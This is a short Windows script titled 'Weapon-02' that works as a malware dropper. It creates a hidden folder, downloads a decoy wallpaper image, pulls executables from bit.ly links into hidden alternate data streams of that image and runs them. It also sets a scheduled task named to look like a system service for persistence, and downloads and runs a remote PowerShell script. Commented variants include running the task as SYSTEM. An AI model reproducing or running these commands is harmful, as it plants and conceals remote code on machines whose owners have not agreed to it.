# Weapon-02

mkdir C:\ProgramData\.temp
[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jpg
cmd /c "curl https://bit.ly/3sIId5a -o C:\ProgramData\.temp\94002.jpg:services.exe && C:\ProgramData\.temp\94002.jpg:services.exe"
# schtasks /create /s $env:ComputerName /ru "SYSTEM" /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 12/25/2025 /st 15:00:00 /v1 /z
cmd /c 'schtasks /create /tn "servicesfc.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /st 15:00 /sd 12/25/2025'
wget -O C:\ProgramData\.temp\system64.ps1 https://bit.ly/3KlymYH
C:\ProgramData\.temp\system64.ps1

# cmd /c "wget -O C:\ProgramData\.temp\94002.jpg:system64.exe https://bit.ly/3N1H14G && C:\ProgramData\.temp\94002.jpg:system64.exe"
